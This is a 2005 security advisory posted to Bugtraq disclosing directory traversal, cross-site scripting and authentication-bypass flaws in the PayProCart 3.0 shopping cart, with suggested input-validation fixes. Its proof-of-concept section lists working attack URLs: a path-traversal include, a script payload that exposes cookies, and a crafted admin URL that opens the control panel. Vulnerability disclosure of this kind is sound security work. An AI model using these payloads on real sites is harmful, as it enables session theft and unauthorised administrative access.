
Date: 4 Apr 2005 22:52:19 -0000
From: dcrab <dcrab@...kerscenter.com>
To: bugtraq@...urityfocus.com
Subject: Authenticaion bypass, Directory transversal and XSS
    vulnerabilities in PayProCart 3.0 - Profitcode Software





-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Dcrab 's Security Advisory
[Hsc Security Group] http://www.hackerscenter.com/
[dP Security] http://digitalparadox.org/

Get Dcrab's Services to audit your Web servers, scripts, networks, etc. Learn more at http://www.digitalparadox.org/services.ah

Severity: High
Title: Authenticaion bypass, Directory transversal and XSS vulnerabilities in PayProCart 3.0 - Profitcode Software
Date: 05/04/2005

Vendor: ProftCode Softwares
Vendor Website: http://www.profitcode.net
Summary: There are, authenticaion bypass, directory transversal and xss vulnerabilities in payprocart 3.0 - profitcode software.

Proof of Concept Exploits: 

http://localhost/index.php?modID=../EVIL_VALUE
Directory Transversal
Warning: main(tplates/../EVIL_VALUE.php) [function.main]: failed to open stream: No such file or directory in /home/*******/web/*******/index.php on line 159


Warning: main() [function.include]: Failed opening 'tplates/../EVIL_VALUE.php' for inclusion (include_path='.:/usr/local/lib/php') in /home/*******/web/*******/index.php on line 159

http://localhost/usrdetails.php?sgnuptype=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
Pops Cookie


http://localhost/adminshop/index.php?proMod=index&amp%3bftoedit=..%2fshopincs%2fmaintopENG
Authentication Bypass, Gives access to Admin control panel
After a couple seconds press stop and done, look done at the last screen, thats the administration panel, you now have admin access to the shopping cart.


Possible Fixes: The usage of htmlspeacialchars(), mysql_escape_string(), mysql_real_escape_string() and other functions for input validation before passing user input to the mysql database, or before echoing data on the screen, would solve these problems.

Keep your self updated, Rss feed at: http://digitalparadox.org/rss.ah

Author: 
These vulnerabilties have been found and released by Diabolic Crab, Email: dcrab[AT|NOSPAM]hackerscenter[DOT|NOSPAM]com, please feel free to 
contact me regarding these vulnerabilities. You can find me at, http://www.hackerscenter.com or http://digitalparadox.org/. Lookout for my soon to come out book on Secure coding with php. 
-----BEGIN PGP SIGNATURE-----
Version: PGP 8.1 - not licensed for commercial use: www.pgp.com

iQA/AwUBQlFhqSZV5e8av/DUEQIgwACgxNEQ+C4Sy3x6of/R5CF+klPpNEEAoJi3
UzBEsLKM5uDraMzb/rNUUrRU
=zUyN
-----END PGP SIGNATURE-----


